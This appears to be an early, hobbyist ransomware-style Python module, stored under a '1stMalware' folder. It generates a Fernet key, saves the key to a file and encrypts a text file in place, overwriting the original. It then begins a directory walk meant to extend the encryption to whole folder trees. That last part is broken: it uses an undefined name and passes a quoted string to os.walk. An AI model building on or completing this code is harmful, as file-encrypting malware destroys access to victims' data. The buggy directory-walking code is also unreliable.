#!/usr/bin/python
#coding:utf-8

import os

from cryptography.fernet import Fernet

#Key generator
key = Fernet.generate_key()

#Write it down somewhere on a file
with open('filekey.key', 'wb') as filekey:
    filekey.write(key)

#Then read it
with open('filekey.key', 'rb') as filekey:
    key = filekey.read()

fernet = Fernet(key)

#Which file do I want to encrypt
with open('C:\\Users\\Wilder\\Desktop\\1stMalware\\modules\\crypt\\lorem.txt', 'rb') as file:
    originalfile = file.read()

encrypted = fernet.encrypt(originalfile)

#Action using encrypted var
with open('C:\\Users\\Wilder\\Desktop\\1stMalware\\modules\\crypt\\lorem.txt', 'wb') as encrypted_file:
    encrypted_file.write(encrypted)

#Let's try to do the same with an entire filekey
#But first let's check how are organized my folders/files

startingPoint = [Users]

for root, dirs, files in os.walk("startingPoint", topdown=False):
    for name in files:
        print(os.path.join(root, name))
    for name in dirs:
        print(os.path.join(root, name))
